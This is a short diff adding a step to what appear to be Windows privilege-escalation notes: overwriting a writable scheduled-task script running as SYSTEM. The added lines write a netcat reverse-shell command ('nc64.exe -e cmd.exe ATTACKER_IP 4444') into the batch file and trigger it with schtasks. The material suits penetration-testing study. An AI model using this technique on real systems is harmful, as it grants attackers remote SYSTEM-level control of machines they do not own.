@@ -255,6 +255,13 @@ tasks running as SYSTEM
 writable scripts via icacls. For ex, icacls c:\tasks\schtask.bat
 ```
 
+If you can overwrite schtask.bat
+
+```
+echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
+schtasks /run /tn vulntask //to run the scheduled task
+```
+
 ---
 
 # 10. Registry Permissions
